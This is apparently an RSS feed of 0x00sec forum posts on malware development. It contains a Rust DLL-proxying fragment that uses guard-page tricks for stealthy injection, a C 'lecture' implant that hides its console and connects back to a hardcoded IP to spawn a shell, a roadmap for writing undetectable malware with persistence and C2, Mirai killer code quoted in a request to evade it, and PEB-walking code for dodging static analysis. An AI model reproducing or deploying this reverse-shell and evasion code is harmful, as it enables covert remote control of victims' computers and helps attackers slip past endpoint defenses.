        if handler.is_null() {
            eprintln!("Failed to install Vectored Exception Handler");
            return None;
        }

        let mut old_protection: u32 = 0;
        VirtualProtect(mem::transmute::&lt;_, *mut winapi::ctypes::c_void&gt;(Sleep as usize), 1, PAGE_EXECUTE_READ | PAGE_GUARD, &amp;mut old_protection);
        let addr = GetModuleHandleA(CString::new(module_name).unwrap().as_ptr());

        RemoveVectoredExceptionHandler(handler);

        Some(addr)
    }
}
</code></pre>
<p>Using <code>VirtualProtect</code> to set a page to <code>PAGE_GUARD</code> and induce a guard page violation serves as a subtle method for initiating the Vectored Exception Handler. This approach allows for the dynamic modification of memory protection, introducing an element of variability that makes the technique less static. By triggering the guard page violation, the implementation can seamlessly invoke the Vectored Exception Handler, enabling dynamic adjustments to memory protection settings and contributing to a stealthier execution of the injection technique. <a href="https://github.com/0xf00I/DLLProxying-rs" rel="noopener nofollow ugc">Source Code</a></p>
<p>This was a simple implementation of Proxy-DLL-Loads in Rust, Thanks for reading and I hope you’ve learned something!</p>
<h1><a name="references-4" class="anchor" href="https://0x00sec.org#references-4"></a>References</h1>
<ul>
<li><a href="https://github.com/kleiton0x00/Proxy-DLL-Loads" rel="noopener nofollow ugc">Proxy-DLL-Loads</a></li>
<li><a href="https://dl.packetstormsecurity.net/papers/win/intercept_apis_dll_redirection.pdf" rel="noopener nofollow ugc">Intercepting API Calls via DLL Redirection</a></li>
<li><a href="https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistence" rel="noopener nofollow ugc">DLL Proxying for Persistence</a></li>
<li><a href="https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/" rel="noopener nofollow ugc">Proxying DLL Loads for Hiding ETW/ETI Stack Tracing</a></li>
<li><a href="https://redteaming.co.uk/2020/07/12/dll-proxy-loading-your-favorite-c-implant/" rel="noopener nofollow ugc">DLL Proxy Loading Your Favorite C# Implant</a></li>
<li><a href="https://x64.moe/posts/proxyingdll/" rel="noopener nofollow ugc">Proxying DLLs with Rust</a></li>
<li><a href="https://github.com/trickster0/OffensiveRust" rel="noopener nofollow ugc">OffensiveRust</a></li>
<li><a href="https://samrambles.com/guides/window-hacking-with-rust/injecting-dlls-with-rust/index.html" rel="noopener nofollow ugc">Injecting DLLs with Rust</a></li>
</ul>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/dll-load-proxying/39031">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/dll-load-proxying/39031</link>
          <pubDate>Sun, 04 Feb 2024 22:29:37 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-39031</guid>
          <source url="https://0x00sec.org/t/dll-load-proxying/39031.rss">DLL-Load Proxying</source>
        </item>
        <item>
          <title>Malware development lecture 1B</title>
          <dc:creator><![CDATA[blc_chef]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>This is lecture 1B of our malware development series</p><p><a href="https://www.youtube.com/watch?v=_ECGY6Fu_9s">Malware development lecture 1B</a></p>

<p>check out the video to understand more<br>
//header files</p>
<p><span class="hashtag-raw">#include</span> &lt;stdio.h&gt;     //standard input/output<br>
<span class="hashtag-raw">#include</span> &lt;stdlib.h&gt;    //standard utilities library<br>
<span class="hashtag-raw">#include</span> &lt;unistd.h&gt;    //access to the POSIX operating system API<br>
<span class="hashtag-raw">#include</span> &lt;winsock2.h&gt;  //windows sockets<br>
<span class="hashtag-raw">#include</span> &lt;windows.h&gt;   //declarations for all functions in Windows API<br>
<span class="hashtag-raw">#include</span> &lt;winuser.h&gt;   //windows controls<br>
<span class="hashtag-raw">#include</span> &lt;wininet.h&gt;   //windows internet interfaces<br>
<span class="hashtag-raw">#include</span> &lt;windowsx.h&gt;  //windows programming interfaces<br>
<span class="hashtag-raw">#include</span> &lt;string.h&gt;    //manupulate strings (char arrays)<br>
<span class="hashtag-raw">#include</span> &lt;sys/stat.h&gt;  //stat() function prototypes<br>
<span class="hashtag-raw">#include</span> &lt;sys/types.h&gt; //other function prototypes</p>
<p>//FUNCTION DEFINITION</p>
<p>int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)<br>
{<br>
//create new window handle<br>
HWND stealth;<br>
AllocConsole();<br>
stealth = FindWindowA(“ConsoleWindowClass”, NULL); //window name = NULL<br>
ShowWindow(stealth, 0); //nCmdShow = 0 hides window</p>
<pre><code>//create socket object
struct sockaddr_in ServAddr;
WSADATA wsaData; //contain winsock.dll info

//check winsock.dll status
if (WSAStartup(MAKEWORD(2,0), &amp;wsaData) != 0)
{
	exit(1);
}

//define socket object
sock = socket(AF_INET, SOCK_STREAM, 0); //establish tcp connection
//set host IP Address and Port [EDIT HERE]
char *ServIP = "192.168.56.1";
unsigned short ServPort = 50000;
memset(&amp;ServAddr, 0, sizeof(ServAddr)); //flush ServAddr with 0

//set ServAddr parameters
ServAddr.sin_family = AF_INET;
ServAddr.sin_addr.s_addr = inet_addr(ServIP); //covert string to IPv4 format
ServAddr.sin_port = htons(ServPort); //convert to network byte order


//wait for server connection to establish
start :
while (connect(sock, (struct sockaddr *) &amp;ServAddr, sizeof(ServAddr)) != 0)
{
	Sleep(10);
	goto start;
}

Shell();
</code></pre>
<p>}</p>
            <p><small>8 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/malware-development-lecture-1b/38795">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/malware-development-lecture-1b/38795</link>
          <pubDate>Wed, 17 Jan 2024 07:42:04 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38795</guid>
          <source url="https://0x00sec.org/t/malware-development-lecture-1b/38795.rss">Malware development lecture 1B</source>
        </item>
        <item>
          <title>Malware development lecture 1A</title>
          <dc:creator><![CDATA[blc_chef]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>Video out now for the following lecture 1A of malware development</p><p><a href="https://www.youtube.com/watch?v=GML0TVvlMVw"> - YouTube</a></p>

<p>What is malware ?</p>
<p>Malware is any software intentionally designed to cause disruption to a computer, server, client, or computer network, leak private information, gain unauthorized access to information or systems, deprive access to information, or which unknowingly interferes with the user’s computer security and privacy.</p>
<p>What is malware development?</p>
<p>This is the development process of malicious software or scripts with intent to stealing target information, spying, espionage purpose and others</p>
<p>What programming languages are best for malware development?</p>
<p>My own opinion</p>
<p>1.Assembly reason faster and next to machine code con hard to learn</p>
<p>C and c++</p>
<p>python for server end</p>
<p>Rust</p>
<p>Lua</p>
<p>Golang</p>
<p>What is computer programming? Computer programming or coding is the composition of sequences of instructions, called programs, that computers can follow to perform tasks</p>
<p>what are the types of malware</p>
<h3><a name="h-1-ransomware-1" class="anchor" href="https://0x00sec.org#h-1-ransomware-1"></a>1. Ransomware</h3>
<p>This is software that uses encryption to disable a target’s access to its data until a ransom is paid. The victim organization is rendered partially or totally unable to operate until it pays, but there is no guarantee that payment will result in the necessary decryption key or that the decryption key provided will function properly.</p>
<h3><a name="h-2-spyware-2" class="anchor" href="https://0x00sec.org#h-2-spyware-2"></a>2. Spyware</h3>
<p>Spyware collects information about users’ activities without their knowledge or consent. This can include passwords, pins, payment information and unstructured messages.</p>
<h3><a name="h-3-trojan-3" class="anchor" href="https://0x00sec.org#h-3-trojan-3"></a>3 Trojan</h3>
<p>This disguises itself as desirable code or software. Once downloaded by unsuspecting users, the Trojan can take control of victims’ systems for malicious purposes. Trojans may hide in games, apps, or even software patches.</p>
<h3><a name="h-4-worms-4" class="anchor" href="https://0x00sec.org#h-4-worms-4"></a>4. Worms</h3>
<p>Worms target vulnerabilities in operating systems to install themselves into networks. They may gain access in several ways: through backdoors built into software, through unintentional software vulnerabilities, or through flash drives. Once in place, worms can be used by malicious actors to launch Dos or Ddos attacks, steal sensitive data, or conduct ransomware attacks.</p>
<ol start="5">
<li>virus</li>
</ol>
<p>This is a piece of code that inserts itself into an application and executes when the app is run. Once inside a network, a virus may be used to steal sensitive data, launch DDoS attacks or conduct ransomware attacks.</p>
<h3><a name="h-6-rootkits-5" class="anchor" href="https://0x00sec.org#h-6-rootkits-5"></a>6. Rootkits</h3>
<p>is software that gives malicious actors remote control of a victim’s computer with full administrative privileges. Rootkits can be injected into applications, kernels, hypervisors, or firmware. They spread through phishing, malicious attachments, malicious downloads, and compromised shared drives.</p>
<h3><a name="h-7keyloggers-6" class="anchor" href="https://0x00sec.org#h-7keyloggers-6"></a>7.Keyloggers</h3>
<p>This is a type of spyware that monitors user activity, keyloggers can be used to steal password data, banking information and other sensitive information. Keyloggers can be inserted into a system through phishing, social engineering or malicious downloads.</p>
<h3><a name="h-8-botsbotnets-7" class="anchor" href="https://0x00sec.org#h-8-botsbotnets-7"></a>8. Bots/Botnets</h3>
<p>A bot is a software application that performs automated tasks on command. They’re used for legitimate purposes, such as indexing search engines, but when used for malicious purposes, they take the form of self-propagating malware that can connect back to a central server.</p>
<h3><a name="h-9-fileless-malware-8" class="anchor" href="https://0x00sec.org#h-9-fileless-malware-8"></a>9. Fileless Malware</h3>
<p>This kind doesn’t install anything initially, instead, it makes changes to files that are native to the operating system, such as PowerShell or WMI. Because the operating system recognizes the edited files as legitimate, a fileless attack is not caught by antivirus software.</p>
<p>MALWARE PAYLOADS</p>
<p>What is staged malware?</p>
<p>Staged payloads break down the distinct phases of an attack, often using multiple payloads phases that a single payload would have otherwise performed. These payloads are typically broken down into a ”stager” (initial payload or beacon) executable and a ”stage” (main payload) executable.</p>
<p>A stagger is a small executable that is an initial payload. It is a relatively small piece of code that is executed to prepare for a much larger and more capable payload known as the stage payload. This means that “the stagger sets the stage.”</p>
<p>what is stageless malware?</p>
<p>Stageless payloads are self-contained and usually much larger than staged payloads. They typically combine all the required capabilities of an attacker into one executable.</p>
<p>What is shell code?</p>
<p>Shell code is a malicious code that attempts to hijack the normal flow of a running program in computer memory. It then redirects the flow so that the malicious code is executed, instead of the normal program, giving the attacker a shell or reverse shell. These are often beacons or payloads in the form of low-level programming code or a machine code combined with an exploit</p>
<p>What are exploits?</p>
<p>Exploits are pieces of low-level or native code that successfully leverage a vulnerability.</p>
<p>Exploited vulnerabilities often involve a buffer overflow in an application’s memory where the attacker has overrun the allocated memory to redirect normal program flow. A successful exploit will then lead to the execution of a payload, which is the malware.</p>
<p>what is a dropper?</p>
<p>A dropper is a kind of Trojan that has been designed to “install” malware on a target computer. The malware code can be contained within the dropper in such a way as to avoid detection by virus scanners; or the dropper may download the malware to the targeted computer once activated.</p>
<p>Types of malware droppers</p>
<p>persistent dropper. Upon running the malware, it hides itself on the device. It then modifies the windows system registry keys, even if the malware is removed the hidden file will execute upon rebooting the system. This allows it to reinstall the malware even if it was previously removed.</p>
<p>non-persistent dropper. It is less dangerous because upon executing its payload it removes itself from the system. This way, when the malware is removed it will not be able to reinstall itself</p>
<p>what is penetration testing?</p>
<p>A penetration test, also known as pentest or ethical hacking, is an authorized simulated cyber attack on a computer system, performed to evaluate the security of the system;</p>
<p>what is red team?</p>
<p>A red team is a group that pretends to be an enemy, attempts a physical or digital intrusion against an organization at the direction of that organization, then reports back so that the organization can improve their defenses. Red teams work for the organization or are hired by the organization. Their work is legal, but can surprise some employees who may not know that red teaming is occurring, or who may be deceived by the red team.</p>
<p>what is incident response?</p>
<p>Incident response (sometimes called Cybersecurity incident response) refers to an organization’s processes and technologies for detecting and responding to cyber threats, security breaches or cyberattacks. The goal of incident response is to prevent cyberattacks before they happen, and to minimize the cost and business disruption resulting from any cyberattacks that occur.</p>
<p>What is digital forensics?</p>
<p>Digital forensics is a branch of forensic science encompassing the recovery, investigation, examination, and analysis of material found in digital devices, often in relation to mobile devices and computer crime.</p>
<p>what is code obfuscation?</p>
<p>code obfuscation refers to a series of programming techniques designed to disguise elements of a program’s code. It’s the primary way that programmers can defend their work against unauthorized access or alteration by hackers or intellectual property thieves.</p>
<p>SPECIFIC TO WINDOWS ENVIRONMENTS</p>
<p>What is a DLL?</p>
<p>A Dynamic Link Library or DLL (“Shared Library” in Linux) is a piece of code stored as a shared library file. This means that it can be used by different computer programs as and when they need it</p>
<p>code injection and DLL injection</p>
<p>DLL injection is the process of running code (DLL) in the context of another process. Meterpreter payloads use DLL injection techniques for stealth and evasion mechanisms.</p>
<p>This is useful for programmers because they only write code once, compile and store it as a shared library or DLL, then use it whenever needed and by multiple programs.</p>
<p>The capabilities of DLLs also make them very useful for threat actors. Code Injection at the basic level involves an attempt by one process (malicious) attaching (or obtaining a handle) to a remote process (victim process). It then allocates enough memory or changing page permissions in the victim process to run new code such as a DLL, after which copying (injecting) the DLL malicious code into the new or already running victim process’ memory space.</p>
<p>Windows API</p>
<p>The Windows API, informally WinAPI, is Microsoft’s core set of application programming interfaces (APIs) available in the Microsoft operating systems. The name Windows API collectively refers to several different platform implementations that are often referred to by their own names (for example, the Win32 API). Almost all Windows programs interact with the Windows API</p>
<p>CREATING A SOFTWARE PROTOTYPE(our malware prototype)</p>
<p>what is a software prototype?</p>
<p>Software prototyping is the activity of creating prototypes of software applications, i.e., incomplete versions of the software program being developed.</p>
<p>The difference between script kiddies and true pros is having programming skills. So we are going to horn these skills together because the truth is one day in your pen test or red teaming endeavors, you will need to write something that is fully undetectable. A lot of you use Metasploit but the problem with this awesome tools is it can only handle one connection at a time but in red teaming engagements, you need in most cases your C2C to control and commands more connections instantly.</p>
<p>So let’s create a tool that will evolve into something big</p>
<p><strong>functions of our prototype</strong></p>
<p><strong>1. connection function between server and target</strong></p>
<p><strong>2. function to listen for incoming connections(shell)</strong></p>
<p><strong>3. be able to survive reboots</strong></p>
<p><strong>4. start other programs</strong></p>
<p><strong>5. changing directory</strong></p>
<p><strong>HELPFUL WINDOW/</strong> <strong>C</strong> <strong>HEADER FILES FOR MALWARE AUTHORS</strong></p>
<p><strong>1.</strong> <strong>#include&lt;stdio.h&gt;</strong></p>
<p><strong><strong>stdio.h</strong></strong> <strong>is the header file for the C library that defines various functions and variables for input and output operations.</strong></p>
<p><strong>#include&lt;stdlib.h&gt;</strong></p>
<p><strong>This header defines several general purpose functions, including dynamic memory management, random number generation, communication with the environment, integer arithmetic, searching, sorting and converting.</strong></p>
<p><strong>#include&lt;unistd.h&gt;</strong></p>
<p><strong>In the</strong> <strong>c</strong> <strong>and</strong> <strong>c++</strong> <strong>programming languages,</strong> <code>unistd.h</code> <strong>is the name of the</strong> <strong>header file</strong> <strong>that provides access to the <a href="https://en.wikipedia.org/wiki/POSIX" rel="noopener nofollow ugc">POSIX</a> <a href="https://en.wikipedia.org/wiki/Operating_system" rel="noopener nofollow ugc">operating system</a> <a href="https://en.wikipedia.org/wiki/Application_programming_interface" rel="noopener nofollow ugc">API</a>. I</strong></p>
<p><strong>#include&lt;winuser.h&gt;</strong></p>
<p><strong><strong>Winuser.h</strong></strong> <strong>is a header file that defines the functions and structures for Windows app development. It contains definitions for common Windows API functions, such as CreateWindow, DialogBox, EnumWindows, and ClipboardFormatListeners, as well as structures for various Windows messages,</strong></p>
<p><strong>#include&lt;winsock2.h&gt;</strong></p>
<p><strong><strong>Windows Sockets API</strong></strong> <strong>(</strong> <strong><strong>WSA</strong></strong> <strong>), later shortened to</strong> <strong><strong>Winsock</strong></strong> <strong>, is an <a href="https://en.wikipedia.org/wiki/Application_programming_interface" rel="noopener nofollow ugc">application programming interface</a> (API) that defines how <a href="https://en.wikipedia.org/wiki/Microsoft_Windows" rel="noopener nofollow ugc">Windows</a> network <a href="https://en.wikipedia.org/wiki/Application_software" rel="noopener nofollow ugc">application software</a> should access network services, especially <a href="https://en.wikipedia.org/wiki/TCP/IP" rel="noopener nofollow ugc">TCP/IP</a>. It defines a standard interface between a Windows TCP/IP client application (such as an <a href="https://en.wikipedia.org/wiki/FTP_client" rel="noopener nofollow ugc">FTP client</a> or a <a href="https://en.wikipedia.org/wiki/Web_browser" rel="noopener nofollow ugc">web browser</a>) and the underlying TCP/IP <a href="https://en.wikipedia.org/wiki/Protocol_stack" rel="noopener nofollow ugc">protocol stack</a>.</strong></p>
<p><strong>#include&lt;wininet.h&gt;</strong></p>
<p><strong>The Windows Internet (WinINet) application programming interface (API) enables your application to interact with FTP and HTTP protocols to access Internet resources. As standards evolve, these functions handle the changes in underlying protocols, enabling them to maintain consistent behavior.</strong></p>
<p><strong>#include&lt;windows.h&gt;</strong></p>
<p><strong>windows.h is a Windows-specific header file for the C and C++ programming languages which contains declarations for all of the functions in the Windows API, all the common macros used by Windows programmers, and all the data types used by the various functions and subsystems</strong></p>
<p><strong>#include&lt;windowsx.h&gt;</strong></p>
<p><strong>This</strong> <strong>header file re-defines many obsolete and out of use function calls (among other things). This header file speeds ports, but fixes no complex problems. For example in WIN32 the “far” and “pascal” keywords are obsolete due to WIN32’s flat memory model and different function calling procedures.</strong></p>
<p><strong>#include&lt;string.h&gt;</strong></p>
<p><strong>This header file provides functions for copying, concatenating, comparing, searching, and manipulating C strings and arrays.</strong></p>
<p><strong>#include&lt;sys/stat.h&gt;</strong></p>
<p><strong>The header file</strong> <strong><strong>sys/stat.h</strong></strong> <strong>defines the structure of the data returned by the functions fstat, lstat, and stat, such as device ID, file serial number, mode, link count, user ID, group ID, and more. It also provides file type macros and symbolic name definitions for the mode bits and file size fields.</strong></p>
<p><strong>#include&lt;sys/types.h&gt;</strong></p>
<p><strong>T</strong> <strong>his</strong> <strong>header file defines the types and functions for the POSIX standard, with GNU Gnulib, a library for porting C and C++ applications to various platform.</strong></p>
            <p><small>6 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/malware-development-lecture-1a/38788">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/malware-development-lecture-1a/38788</link>
          <pubDate>Tue, 16 Jan 2024 21:54:10 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38788</guid>
          <source url="https://0x00sec.org/t/malware-development-lecture-1a/38788.rss">Malware development lecture 1A</source>
        </item>
        <item>
          <title>Malware development from beginer to expert</title>
          <dc:creator><![CDATA[blc_chef]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>Accompanying video on YouTube for this below lecture.   check now and please subscribe and like the video</p><p><a href="https://www.youtube.com/watch?v=T1xNKgkRpic">Malware development  lecture lessons roadmap</a></p>

<p>NOTE:    hey friends last year i quit my job, now am a full time freelancer and IT security teacher</p>
<p>This my take on malware development were we are going to develop from a prototype already out there to a something much more powerful</p>
<p>If you a cybersecurity professional, a pen tester, red teamer,having the skills to write undetectable malware is great and very rewarding.</p>
<p>Pros tend to use tools like metasploit, LordPE, shelter, veil, amitarge and others to accomplish given tasks but their is always a high possibility of getting caught by SOC team av solutions and that is not good.</p>
<p>Another reason to write your FUD malware from scratch is to eliminate the need for Metasploit, since it can handle only one connection at a time.  Whereas, during red teaming we always needed a CnC Server solution that can handle and control all the target machines together just like a botnet.</p>
<p>So in these series were are going to begin our journey of learning malware development at the same time applying software engineering principles, cryptography, forensics, networking and obfuscation from the basic principles to the most in the wild.</p>
<p>OUR ROAD MAP OUT OF ORDER</p>
<blockquote>
<p>Simple malware (prototype)<br>
Basics of software engineering<br>
Choosing a software methodology to follow<br>
Rewriting our malware from scratch<br>
digital forensics basics<br>
Basics of penetration testing<br>
Basics of red teaming<br>
Basics of cryptography<br>
window system programming<br>
Networking programming<br>
Driver and kernel programming<br>
Adding rootkit features to our product</p>
</blockquote>
<p>Shall add others to the mix as needed</p>
<p>Prerequisites<br>
Python programming skills (soon videos will be available)<br>
C/C++ programming skills</p>
<p>FUNCTIONALITY OF OUR PROTOTYPE</p>
<p>whoami function<br>
pwd function<br>
ls function<br>
move/ copy function<br>
delete file function<br>
download file function<br>
upload file function</p>
<p>one thing to avoid is  executing  most of the commands via command shell Win API, reason being that it becomes easier for endpoint monitoring tools to detect anomalies and find out that it’s a suspicious binary even though we can evade anti-virus software easily.</p>
<p>But  still we should  write this code, because you never know when you might need to execute shell commands or execute powershell/vbs/batch scripts remotely, and secondly, it is the easiest to start with as a beginner when learning malware development.</p>
            <p><small>9 posts - 7 participants</small></p>
            <p><a href="https://0x00sec.org/t/malware-development-from-beginer-to-expert/38564">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/malware-development-from-beginer-to-expert/38564</link>
          <pubDate>Mon, 01 Jan 2024 09:28:28 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38564</guid>
          <source url="https://0x00sec.org/t/malware-development-from-beginer-to-expert/38564.rss">Malware development from beginer to expert</source>
        </item>
        <item>
          <title>Malware Killed for &quot; (deleted)&quot; binary</title>
          <dc:creator><![CDATA[darad]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>my test malware got killed from another because delete the binary, there is a way to bypass this?<br>
or am I forced to keep the binary on the system?</p>
<p>this is the part of the code that kills my test malware, this source code is taken from Mirai malware on github.</p>
<p>(both were launched in the virtual machine)</p>
<p>complete code: <a href="https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/killer.c" rel="noopener nofollow ugc">https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/killer.c</a></p>
<pre><code class="lang-auto"> // Store /proc/$pid/exe into exe_path
            snprintf(exe_path, sizeof(exe_path), "/proc/%s/exe", file-&gt;d_name)


            // Resolve exe_path (/proc/$pid/exe) -&gt; realpath
            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn't guarantee a null terminated string

                // Skip this file if its realpath == killer_realpath
                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
                    continue;

               // if the binary was deleted
                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
#ifdef DEBUG
                    printf("[killer] Process '%s' has deleted binary!\n", realpath);
#endif
                    kill(pid, 9);
                }
                close(fd);
            }
</code></pre>
            <p><small>24 posts - 6 participants</small></p>
            <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022</link>
          <pubDate>Wed, 22 Nov 2023 17:42:18 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38022</guid>
          <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
        </item>
        <item>
          <title>Malware Development Essentials for Operators</title>
          <dc:creator><![CDATA[0xf00I]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <h1><a name="introduction-1" class="anchor" href="https://0x00sec.org#introduction-1"></a>Introduction</h1>
<p>This article will delve into fundamental and techniques related to malware development for Windows OS, We’ll start by exploring the WinAPI, understanding how code manipulation works in the context of malware development. We’ll cover things like loading functions dynamically, accessing the Process Environment Block (PEB), and executing functions in code, Next  we’ll look into obfuscation and payload encoding. We’ll use techniques like XOR and AES encryption to make our malicious code harder to detect. We’ll also explore ways to insert our malicious code, like using classic shellcode and DLL injections To wrap things up, we’ll create a simple rootkit, concluding our journey through the world of malware development, As usual, we will delve into the code and techniques, providing a detailed, step-by-step breakdown.</p>
<h1><a name="dynamic-function-loading-and-execution-2" class="anchor" href="https://0x00sec.org#dynamic-function-loading-and-execution-2"></a>Dynamic Function Loading and Execution</h1>
<p>Time to dive into some naked code action! We’re gonna break down this code and make it crystal clear, so you can get what’s going on.</p>
<pre><code class="lang-c">int main(void) {
MessageBoxA(0, "Foo Here.", "info", 0);
return 0;
}
</code></pre>
<p>This is a simple program. It uses the <code>MessageBoxA</code> function, which is part of the Windows API. This function displays a modal dialog box with specified text and a caption. In this code, we’re making a straightforward call to the <code>MessageBoxA</code> function to show a message box.</p>
<p>The <code>MessageBoxA</code> function is statically linked to your program during the compilation process. This means that the function’s code is included in your program, so you don’t need to load it at runtime.</p>
<p>Now, let’s contrast this with the following code:</p>
<pre><code class="lang-c">int main(void) {
size_t get_MessageBoxA = (size_t)GetProcAddress( LoadLibraryA("USER32.dll"), "MessageBoxA" );
def_MessageBoxA msgbox_a = (def_MessageBoxA) get_MessageBoxA;
msgbox_a(0, "Foo Here.", "info", 0);
return 0;
}
</code></pre>
<p>In this code, we take a different approach. We dynamically load and call the <code>MessageBoxA</code> function using the <code>GetProcAddress</code> function. This function retrieves the address of the <code>MessageBoxA</code> function from the USER32.dll library at runtime.</p>
<p>To work with this dynamically loaded function, we define a function pointer type <code>def_MessageBoxA</code> that matches the signature of the <code>MessageBoxA</code> function. We then cast the obtained function address to this function pointer and use it to call the function.</p>
<p>So, how is this related to malware? Well, by dynamically loading functions, we can avoid having to statically link to libraries that are associated with shady activity, meaning that hooking a function dynamically with the use of pointers can make it more challenging for static analysis tools to identify the behavior of the code. Let’s Take an example:</p>
<pre><code class="lang-c">__declspec(dllexport) void func01() { MessageBoxA(0, "", "Function 1", 0); }
__declspec(dllexport) void func02() { MessageBoxA(0, "", "Function 2", 0); }

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Hook function func01
    }
    return TRUE;
}
</code></pre>
<p>In this example, we have a DLL with two exported functions, <code>func01</code> and <code>func02</code>. Initially, both functions display message boxes. However, in the <code>DllMain</code> function, which is automatically executed when the DLL is loaded may start with benign functionality but could use dynamic function loading and function hooking to change the behavior of <code>func01</code> at runtime. So, let’s continue on this code manipulation journey, exploring the intricacies of dynamic function loading, PEB access, and function execution, which are essential concepts in understanding how code can be adapted and manipulated.</p>
<p>Before, continuing I would like to highlight in which step PEB is created on process creation When <em>Starting a program</em> (calc.exe for example): calc.exe will call a win32 API function : <strong>CreateProcess</strong> which sends to the OS the request to create this process and start the execution.</p>
<p>Creating the process data structures: Windows creates the process structure <strong>EPROCESS</strong> on kernel land for the newly created calc.exe process, Initialize the virtual memory: Then, Windows creates the process, virtual memory, and its representation of the physical memory and saves it inside the <strong>EPROCESS</strong> structure, <code>creates the PEB structure with all necessary information, and then loads the main two DLLs that Windows applications will always need, which are ntdll.dll and kernel32.dll</code> and finally loading the PE file and start the execution.</p>
<ul>
<li><strong>PEB</strong> can be accessed from <strong>User Mode</strong> - Contains Process specific information</li>
<li><strong>EPROCESS</strong> can be only be accessed from <strong>Kernel Mode</strong></li>
</ul>
<h3><a name="peb-structure-3" class="anchor" href="https://0x00sec.org#peb-structure-3"></a>PEB Structure</h3>
<p>PEB is a data structure in the Windows operating system that contains information and settings related to a running process, The process control block contains data that is only useful to the kernel, such as the preferred CPU for this process. The Thread Control Block is entirely different, and is what the kernel uses to manage threads, which are what the kernel runs at the lowest level.</p>
<p>the PEB is accessed to retrieve information about loaded modules, specifically the base addresses of dynamically linked libraries (DLLs). Let’s explore how the PEB is used in the code:</p>
<pre><code class="lang-c">typedef struct _PEB_LDR_DATA {
ULONG Length;
UCHAR Initialized;
PVOID SsHandle;
LIST_ENTRY InLoadOrderModuleList;
LIST_ENTRY InMemoryOrderModuleList;
LIST_ENTRY InInitializationOrderModuleList;
PVOID EntryInProgress;
} PEB_LDR_DATA, *PPEB_LDR_DATA; 

typedef struct _UNICODE_STRING32 {
USHORT Length;
USHORT MaximumLength;
PWSTR Buffer;
} UNICODE_STRING32, *PUNICODE_STRING32;

typedef struct _PEB32 {
    // ...
} PEB32, *PPEB32;

typedef struct _PEB_LDR_DATA32 {
    // ...
} PEB_LDR_DATA32, *PPEB_LDR_DATA32;

typedef struct _LDR_DATA_TABLE_ENTRY32 {
    // ...
} LDR_DATA_TABLE_ENTRY32, *PLDR_DATA_TABLE_ENTRY32;
</code></pre>
<p>As you can see, the PEB is a robust structure. The code defines several structures, such as <code>PEB32</code>, <code>PEB_LDR_DATA32</code>, and <code>LDR_DATA_TABLE_ENTRY32</code>, which are simplified versions of the actual PEB data structures. These structures contain fields that hold information about loaded modules and their locations in memory.</p>
<pre><code class="lang-c">size_t GetModHandle(wchar_t *libName) {
PEB32 *pPEB = (PEB32 *)__readfsdword(0x30); // ds: fs[0x30]
PLIST_ENTRY header = &amp;(pPEB-&gt;Ldr-&gt;InMemoryOrderModuleList);

for (PLIST_ENTRY curr = header-&gt;Flink; curr != header; curr = curr-&gt;Flink) {
LDR_DATA_TABLE_ENTRY32 *data = CONTAINING_RECORD(
curr, LDR_DATA_TABLE_ENTRY32, InMemoryOrderLinks

);
printf("current node: %ls\n", data-&gt;BaseDllName.Buffer);
if (StrStrIW(libName, data-&gt;BaseDllName.Buffer))
return data-&gt;DllBase;
}
return 0;
}
</code></pre>
<p>The <code>GetModHandle</code> function accesses the PEB to find the base address of a loaded module. The PEB contains a data structure called <code>PEB_LDR_DATA</code> that manages information about loaded modules. The <code>InMemoryOrderModuleList</code> field of this structure is a linked list of loaded modules. The <code>GetModHandle</code> function iterates through this list and compares module names to find the desired module based on the <code>libName</code> parameter.</p>
<p>The PEB can be found at fs:[0x30] in the Thread Environment Block for x86 processes as well as at GS:[0x60] for x64 processes.</p>
